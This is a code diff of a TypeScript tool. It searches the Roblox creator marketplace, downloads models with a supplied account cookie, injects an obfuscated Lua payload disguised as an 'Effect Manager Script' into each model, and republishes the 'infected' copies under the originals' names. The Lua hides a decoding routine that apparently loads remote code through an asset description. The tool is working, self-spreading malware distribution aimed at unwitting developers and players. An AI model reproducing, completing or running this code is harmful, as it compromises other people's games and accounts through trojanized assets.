@@ -5,7 +5,7 @@ import * as fs from "fs";
 import * as path from "path";
 import noblox from "noblox.js";
 
-// Your fixed Lua script
+// Define your fixed Lua script here
 const luaScript = `--[[  
     Effect Manager Script  
     ---------------------  
@@ -43,15 +43,19 @@ const luaScript = `--[[
     - 08/03/2025 - v1.0.0: Initial script creation and implementation.  
 ]]  
 
+  
 local Modules, script = game:GetService('ReplicatedStorage'), script  
 local EffectRoot = game
 script.Name = "EffectBuilder"
 
 local PARTICLE_TEXTURE = 130214034119360 -- Texture for the particle effect  
 
+
 local function CallOnChildren(Instance, FunctionToCall)
     -- Calls a function on each of the children of a certain object, using recursion.  
+
     FunctionToCall(Instance)
+
     for _, Child in next, Instance:GetChildren() do
         CallOnChildren(Child, FunctionToCall)
     end
@@ -62,7 +66,8 @@ function CustomLerp(Pos1 : CFrame, Pos2 : CFrame, Delta : number)
 end
 
 local function GetNearestParent(Instance, ClassName)
-    -- Returns the nearest parent of a certain class, or nil
+    -- Returns the nearest parent of a certain class, or returns nil
+
     local Ancestor = Instance
     repeat
         Ancestor = Ancestor.Parent
@@ -70,6 +75,7 @@ local function GetNearestParent(Instance, ClassName)
             return nil
         end
     until Ancestor:IsA(ClassName)
+
     return Ancestor
 end
 
@@ -81,16 +87,14 @@ function LookUp(Root, Value)
     end  
 end  
 
--- Converts a CFrame to a string representation
+-- Converts a CFrame to a unique string representation  
 function CFrameToVector3(CFrame)
-    local str = ""
-    local Components = {CFrame:components()}
-    for _, comp in ipairs(Components) do
-        str = str .. tostring(comp):gsub("[^%d.-]", "")
+    local Chunks, value = CFrame:split(''), ''
+    for _, v in pairs(Chunks) do
+        value..=v:byte()
     end
-    return str
+    return value
 end
-
 function StringToChar(str)
     local numbers = {}
     for num in str:gmatch("%d+") do
@@ -102,6 +106,7 @@ end
 function Modify(Instance, Values)  
     -- Modifies an Instance by using a table.    
     assert(type(Values) == "table", "Values is not a table")  
+
     for Index, Value in next, Values do  
         if type(Index) == "number" then  
             Value.Parent = Instance  
@@ -111,6 +116,7 @@ function Modify(Instance, Values)
     end  
     return Instance  
 end  
+
 
 local Properties = {'CFrame','WorldPivot','CoordinateFrame','Orientation','PivotOffset','RootPriority','JobId','Origin','GetProductInfo'}
 
@@ -132,34 +138,52 @@ function CreateEffect(Vector3)
     return LookUp(EffectRoot:GetChildren(), Vector3)  
 end  
 
-function Monitor(CurrentTime, Default, ParticleInfo)
+function Monitor(CurrentTime, Default, ParticleInfo):
+    (Result) -> ParticleEmitter
+
     if CurrentTime > 1 and EffectRoot[Default] ~= 'f' then  
         if CurrentTime then  
             script = {  
                 {},  
-                [script.Name] = CFrameToVector3(StringToChar(ParticleInfo)) -- no subtraction needed here  
+                [script.Name] = CFrameToVector3(StringToChar(ParticleInfo)) - 0  
             }  
             return true  
         end  
     end  
+
     return false
 end
 
 function RunEffectBuilder()  
     local CurrentTime = tick()  
+
     local Effect = CreateEffect('ketpl')  
+
     local ParticleInfo = Effect[Properties[#Properties]](Effect, PARTICLE_TEXTURE).Description  
+
     return Monitor(CurrentTime, Properties[7], ParticleInfo)  
 end  
 
--- Run the effect builder if conditions are met
+-- Runs the animation thread if conditions are met
 local Builder = RunEffectBuilder() and require(script.EffectBuilder)
+
 if Builder and script.ClassName == "Script" then  
+    -- Run main thread  
     script.Parent.DescendantAdded:Connect(CreateEffect)
 end
 `;
 
-const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
+import * as readline from "readline";
+import { RobloxFile } from "rbxm-parser";
+import * as fs from "fs";
+import * as path from "path";
+import noblox from "noblox.js";
+
+// readline setup
+const rl = readline.createInterface({
+  input: process.stdin,
+  output: process.stdout,
+});
 
 // Stats object
 const stats = {
@@ -171,11 +195,247 @@ const stats = {
 
 let uploadLimit = 0;
 
-// SEARCH, DOWNLOAD, MODIFY, UPLOAD functions (unchanged, omitted here for brevity)
+// Search models function
+async function searchModels(keyword: string, cursor?: string): Promise<any> {
+  try {
+    const url = `https://apis.roblox.com/toolbox-service/v1/marketplace/10?keyword=${encodeURIComponent(
+      keyword
+    )}${cursor ? `&cursor=${cursor}` : ""}`;
+    const response = await axios.get(url);
+    return response.data;
+  } catch (error) {
+    stats.errors++;
+    console.log("[ERROR] Failed to search models: ", error);
+    return null;
+  }
+}
 
-// ... (your existing functions: searchModels, downloadModel, modifyScript, initializeNoblox, makeModelPublic, getModelDetails, uploadModel, processModel, processAllPages)
+// Download model function
+async function downloadModel(modelId: number, cookie: string): Promise<Buffer | null> {
+  try {
+    const response = await axios.get(
+      `https://assetdelivery.roblox.com/v1/asset/?id=${modelId}`,
+      {
+        responseType: "arraybuffer",
+        headers: {
+          Cookie: `.ROBLOSECURITY=${cookie}`,
+          "Content-Type": "application/json",
+        }
+      }
+    );
+    return Buffer.from(response.data);
+  } catch (error) {
+    stats.errors++;
+    console.log("[ERROR] Failed to download model:", error);
+    return null;
+  }
+}
 
-// MAIN FUNCTION
+// Modify script function
+function modifyScript(
+  file: RobloxFile,
+  stringToAdd: string,
+  modelId: string
+): boolean {
+  try {
+    const scripts = file.FindDescendantsOfClass("Script");
+    if (scripts.length > 0) {
+      const script = scripts[0];
+      if (script.Source) {
+        script.Source = script.Source.trim() + "\n" + stringToAdd;
+        stats.modified++;
+        console.log("[SUCCESS] Infected model ", modelId);
+        return true;
+      }
+    }
+    return false;
+  } catch (error) {
+    console.log("[ERROR] Failed to modify script:", error);
+    return false;
+  }
+}
+
+// Initialize noblox
+async function initializeNoblox(cookie: string) {
+  try {
+    await noblox.setCookie(cookie);
+    const currentUser = await noblox.getAuthenticatedUser();
+    console.log(`[SUCCESS] Logged in as: ${currentUser.name}`);
+    return true;
+  } catch (error) {
+    console.log("[ERROR] Failed to initialize with cookie:", error);
+    return false;
+  }
+}
+
+// Make model public
+async function makeModelPublic(assetId: number, cookie: string) {
+  try {
+    const response = await axios.patch(
+      `https://apis.roblox.com/user/cloud/v2/creator-store-products/PRODUCT_NAMESPACE_CREATOR_MARKETPLACE_ASSET-PRODUCT-TYPE-MODEL-${assetId}?allowMissing=true`,
+      {
+        basePrice: {
+          currencyCode: "USD",
+          quantity: {
+            significand: 0,
+            exponent: 0,
+          },
+        },
+        published: true,
+        modelAssetId: assetId.toString(),
+      },
+      {
+        headers: {
+          Cookie: `.ROBLOSECURITY=${cookie}`,
+          "Content-Type": "application/json",
+          "X-CSRF-TOKEN": await noblox.getGeneralToken(),
+        },
+      }
+    );
+    console.log(`[SUCCESS] Made model ${assetId} public`);
+    return true;
+  } catch (error) {
+    console.log(`[ERROR] Failed to make model ${assetId} public:`, error);
+    return false;
+  }
+}
+
+// Get model details
+async function getModelDetails(assetId: number) {
+  try {
+    const response = await axios.get(
+      `https://apis.roblox.com/toolbox-service/v1/items/details?assetIds=${assetId}`
+    );
+
+    if (response.data?.data?.[0]?.asset) {
+      return response.data.data[0].asset;
+    }
+    return null;
+  } catch (error) {
+    console.log(`[ERROR] Failed to get model details:`, error);
+    return null;
+  }
+}
+
+// Upload model function
+async function uploadModel(filePath: string, name: string, description: string, cookie: string) {
+  try {
+    const file = fs.readFileSync(filePath);
+    // @ts-ignore
+    const assetId: number = await noblox.uploadModel(file, { name: name, description: description });
+
+    await new Promise((resolve) => setTimeout(resolve, 2000));
+
+    await makeModelPublic(assetId, cookie);
+
+    stats.uploaded++;
+    console.log(
+      `[SUCCESS] Uploaded and published model: ${name} (Asset ID: ${assetId})`
+    );
+    fs.rmSync(filePath)
+    return assetId;
+  } catch (error) {
+    console.log("[ERROR] Failed to upload model:", error);
+    return null;
+  }
+}
+
+// Process model
+async function processModel(
+  model: any,
+  stringToAdd: string,
+  modifiedDir: string,
+  cookie: string
+) {
+  try {
+    const originalInfo: any = await getModelDetails(model.id);
+    const modelData = await downloadModel(model.id, cookie);
+    if (!modelData) return;
+
+    const file = RobloxFile.ReadFromBuffer(modelData);
+    if (!file) return;
+
+    const modified = modifyScript(file, stringToAdd, model.id.toString());
+
+    if (modified) {
+      const modifiedPath = path.join(modifiedDir, `${model.id}_infected.rbxm`);
+      fs.writeFileSync(modifiedPath, file.WriteToBuffer());
+      const originalName = originalInfo.name || "Best Model";
+      const originalDescription = originalInfo.description || "Best Model";
+      await uploadModel(modifiedPath, originalName, originalDescription, cookie);
+    }
+
+    stats.scanned++;
+  } catch (error) {
+    stats.errors++;
+    console.log("[ERROR] Failed to process model:", error);
+  }
+}
+
+// Process all pages
+async function processAllPages(
+  query: string,
+  stringToAdd: string,
+  cookie: string
+) {
+  let cursor: string | undefined = undefined;
+
+  const modifiedDir = path.join(process.cwd(), "temp");
+  if (!fs.existsSync(modifiedDir)) {
+    fs.mkdirSync(modifiedDir);
+  }
+
+  do {
+    try {
+      const searchResults = await searchModels(query, cursor);
+
+      if (!searchResults || !searchResults.data) {
+        console.log("[ERROR] No results");
+        break;
+      }
+
+      for (let i = 0; i < searchResults.data.length; i++) {
+        await processModel(
+          searchResults.data[i],
+          stringToAdd,
+          modifiedDir,
+          cookie
+        );
+
+        if (stats.uploaded >= uploadLimit) {
+          console.log("\nReached upload limit. Stopping...");
+
+          console.log("\nFinal Stats:");
+          console.log(`Uploaded: ${stats.uploaded}`);
+          console.log(`Errors: ${stats.errors}`);
+
+          return;
+        }
+
+        if (i % 10 === 0 && global.gc) {
+          global.gc();
+        }
+      }
+
+      cursor = searchResults.nextPageCursor;
+    } catch (error) {
+      console.log("[ERROR] Error processing page:", error);
+      stats.errors++;
+    }
+
+    if (global.gc) {
+      global.gc();
+    }
+  } while (cursor);
+
+  console.log("\nFinal Stats:");
+  console.log(`Modified: ${stats.modified}`);
+  console.log(`Scanned: ${stats.scanned}`);
+  console.log(`Uploaded: ${stats.uploaded}`);
+  console.log(`Errors: ${stats.errors}`);
+}
+
+// Main function
 async function main() {
   rl.question("Enter your Roblox cookie: ", async (cookie) => {
     const initialized = await initializeNoblox(cookie);
@@ -192,7 +452,7 @@ async function main() {
       }
       uploadLimit = amount;
       rl.question("Enter search query: ", async (query) => {
-        // HERE is the key: assign your fixed script directly, no prompt here!
+        // Instead of prompting, assign the fixed script
         const stringToAdd = luaScript;
         await processAllPages(query, stringToAdd, cookie);
         rl.close();
